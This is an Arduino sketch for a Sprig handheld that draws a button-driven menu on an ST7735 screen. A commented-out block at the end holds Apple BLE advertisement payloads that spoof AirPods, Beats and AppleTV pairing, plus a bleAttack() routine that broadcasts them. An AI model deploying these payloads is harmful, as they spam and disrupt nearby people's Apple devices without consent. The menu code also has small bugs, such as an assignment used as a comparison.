/*
Experiments with Sprig and Arduino.
*/


#include <Adafruit_GFX.h>     // Core graphics library
#include <Adafruit_ST7735.h>  // Hardware-specific library for ST7735
//#include <Adafruit_ST7789.h> // Hardware-specific library for ST7789
#include <SPI.h>
#include <BTstackLib.h>

#define TFT_CS 21
#define TFT_RST 26  // Or set to -1 and connect to Arduino RESET pin
#define TFT_DC 22



#define WIDTH 160
#define HEIGHT 128


Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);


/*
const char* options[] = {
  "WiFi", "Bluetooth", "Other Tools", "Settings", "Device Info"
};
*/

const char* options[] = {
  "Info", "Bluetooth", "Other Tools", "Settings", "Device Info"
};

const int optionlength = sizeof(options) / sizeof(options[0]);


const int wButtonPin = 5;
const int aButtonPin = 6;
const int sButtonPin = 7;
const int dButtonPin = 8;
const int iButtonPin = 12;
const int jButtonPin = 13;
const int kButtonPin = 14;
const int lButtonPin = 15;




bool lastWButtonState = false;
bool wButtonState = false;
bool lastAButtonState = false;
bool aButtonState = false;
bool lastSButtonState = false;
bool sButtonState = false;
bool lastDButtonState = false;
bool dButtonState = false;

int menuNumber = 1;
int option = 1;

int optionLocation = (9 * (option - 1)) + 12 + 3;


void setup() {
  Serial.begin(115200);
  Serial.print(F("Hello! ST77xx TFT Test"));


  pinMode(wButtonPin, INPUT_PULLUP);
  pinMode(aButtonPin, INPUT_PULLUP);
  pinMode(sButtonPin, INPUT_PULLUP);
  pinMode(dButtonPin, INPUT_PULLUP);
  pinMode(iButtonPin, INPUT_PULLUP);
  pinMode(jButtonPin, INPUT_PULLUP);
  pinMode(kButtonPin, INPUT_PULLUP);
  pinMode(lButtonPin, INPUT_PULLUP);


  /*
  for (int i = 5; i < 9; i++) {
    pinMode(i, INPUT_PULLUP);
  }
  for (int i = 12; i < 16; i++) {
    pinMode(i, INPUT_PULLUP);
  }
  */
  pinMode(17, OUTPUT);
  digitalWrite(17, HIGH);
  // Use this initializer if using a 1.8" TFT screen:
  tft.initR(INITR_BLACKTAB);  // Init ST7735S chip, black tab
  tft.setRotation(3);

  //rocket fast sprig, anyone?

  // SPI speed defaults to SPI_DEFAULT_FREQ defined in the library, you can override it here
  // Note that speed allowable depends on chip and quality of wiring, if you go too fast, you
  // may end up with a black screen some times, or all the time.
  //15MHz seems to be max SPI speed of ST7735
  //maximum SPI data rate of RP2040 is around 62.5 Mbps (62.5 MHz).
  //tft.setSPISpeed(40000000);


  Serial.println(F("Initialized.."));

  tft.fillScreen(ST77XX_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(ST77XX_GREEN);
  tft.println("TITLE - Page 1 of 1");
  //tft.drawTriangle(0, 4, 5, 6, 5, 2, ST77XX_YELLOW);
  tft.drawLine(0, 10, WIDTH, 10, ST77XX_WHITE);
  tft.setCursor(0, 12);
  /*
  tft.setCursor(10, 0);
  tft.setTextColor(ST77XX_GREEN);
  tft.println("TITLE - Page 1 of 1");
  tft.drawTriangle(0, 4, 5, 6, 5, 2, ST77XX_YELLOW);
  tft.drawLine(0, 10, WIDTH, 10, ST77XX_WHITE);
  tft.setCursor(0, 12);
  */
  //so the line is at 10, and we start text at 12.

  /*
  tft.println("Option 1");
  tft.setCursor(0, 21);
  tft.println("Option 2");
  tft.setCursor(0, 30);
  tft.println("Option 3");
  tft.setCursor(0, 39);
  tft.println("Option 4");
  */

  /*
  for (int i = 0; i < sizeof(options) / sizeof(options[0]); i++) {
    tft.setCursor(0, 12 + (9 * i));
    tft.println(options[i]);
    tft.drawLine(0, 20 + (9 * i), WIDTH, 20 + (9 * i), ST77XX_WHITE);
  }

  //tft.drawLine(0, 12, WIDTH, 12, ST77XX_WHITE);
  tft.fillTriangle(WIDTH - 3, optionLocation, WIDTH - 7, optionLocation - 2, WIDTH - 7, optionLocation + 2, ST77XX_YELLOW);
  */

  tft.fillScreen(ST77XX_BLACK);

  tft.setCursor(0, 0);

  tft.setTextColor(ST77XX_GREEN);
  tft.println("title");
  tft.drawLine(0, 10, WIDTH, 10, ST77XX_WHITE);
  tft.setCursor(0, 12);

  for (int i = 0; i < sizeof(options) / sizeof(options[0]); i++) {
    tft.setCursor(0, 12 + (9 * i));
    tft.println(options[i]);
    tft.drawLine(0, 20 + (9 * i), WIDTH, 20 + (9 * i), ST77XX_WHITE);
  }

  tft.fillTriangle(WIDTH - 3, optionLocation, WIDTH - 7, optionLocation - 2, WIDTH - 7, optionLocation + 2, ST77XX_YELLOW);
}


void loop() {


  //Serial.println("I'm still alive,");

  static unsigned long timer = 0;
  unsigned long interval = 50;
  optionLocation = (9 * (option - 1)) + 12 + 3;

  //Serial.println("looping, I guess");
  if (millis() - timer >= interval) {
    //Serial.println("interval");
    timer = millis();
    // read the pushbutton input pin:
    wButtonState = digitalRead(wButtonPin);
    sButtonState = digitalRead(sButtonPin);
    dButtonState = digitalReadFast(dButtonPin);

    if (wButtonState != lastWButtonState) {
      if ((wButtonState == false) && (option > 1) && (menuNumber != 0)) {
        tft.fillTriangle(WIDTH - 3, optionLocation, WIDTH - 7, optionLocation - 2, WIDTH - 7, optionLocation + 2, ST77XX_BLACK);
        Serial.println("wbutton");
        option--;
        optionLocation = (9 * (option - 1)) + 12 + 3;
        tft.fillTriangle(WIDTH - 3, optionLocation, WIDTH - 7, optionLocation - 2, WIDTH - 7, optionLocation + 2, ST77XX_YELLOW);
      }
    }
    if (sButtonState != lastSButtonState) {
      if ((sButtonState == false) && (option < sizeof(options) / sizeof(options[0]) && (menuNumber != 0))) {
        tft.fillTriangle(WIDTH - 3, optionLocation, WIDTH - 7, optionLocation - 2, WIDTH - 7, optionLocation + 2, ST77XX_BLACK);
        Serial.println("sbutton ");
        option++;
        optionLocation = (9 * (option - 1)) + 12 + 3;
        tft.fillTriangle(WIDTH - 3, optionLocation, WIDTH - 7, optionLocation - 2, WIDTH - 7, (optionLocation) + 2, ST77XX_YELLOW);
      }
    }



    if (aButtonState != lastAButtonState) {
      if ((aButtonState == false) && (menuNumber = 0)) {
        tft.fillScreen(ST77XX_BLACK);
        menuNumber = 1;
        //drawMenu("Aed", false, optionlength ,options);
      }
    }

    if (dButtonState != lastDButtonState) {
      if ((dButtonState == false) && (menuNumber != 0)) {
        //tft.fillScreen(ST77XX_BLACK);
        //tft.print("Option ");
        //tft.println(option);
        if (option == 1) {
          showInfo();
        }else if (option == 2) {
          showWiFi();
        }

        menuNumber = 0;
        Serial.println("DDDDD");
      }
    }
  }
  lastWButtonState = wButtonState;
  lastSButtonState = sButtonState;
  lastDButtonState = dButtonState;
  lastAButtonState = aButtonState;
}



//void drawMenu(const char* title, const bool showBackArrow, int length, const char** options) {


void showInfo(){

  tft.fillScreen(ST77XX_BLACK);
  tft.setCursor(10, 10);
  tft.println("SprigZero OS");
}

void showWiFi(){

  tft.fillScreen(ST77XX_BLACK);
  tft.setCursor(10, 10);
  //tft.println("nothing here yet - wifi");
}






/*
const char* payloadNames[] = {
  "Airpods", "Airpods Pro", "Airpods Max", "Airpods Gen 2", "Airpods Gen 3",
  "Airpods Pro Gen 2", "PowerBeats", "PowerBeats Pro", "Beats Solo Pro",
  "Beats Studio Buds", "Beats Flex", "BeatsX", "Beats Solo3", "Beats Studio3",
  "Beats Studio Pro", "Beats Fit Pro", "Beats Studio Buds+", "AppleTV Setup",
  "AppleTV Pair", "AppleTV New User", "AppleTV AppleID Setup", "AppleTV Wireless Audio Sync",
  "AppleTV Homekit Setup", "AppleTV Keyboard", "AppleTV 'Connecting to Network'",
  "Homepod Setup", "Setup New Phone", "Transfer Number to New Phone", "TV Color Balance"
};

const uint8_t payloads[][31] = {
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
};

int spamOption = 1;



void bleAttack() {

  BTstack.loop();
  BTstack.stopAdvertising();
  Serial.println("s button");
  Serial.println(spamOption - 1);
  Serial.println(payloadNames[spamOption - 1]);
  BTstack.setAdvData(sizeof(payloads[spamOption - 1]), payloads[spamOption - 1]);
  BTstack.startAdvertising();

}
*/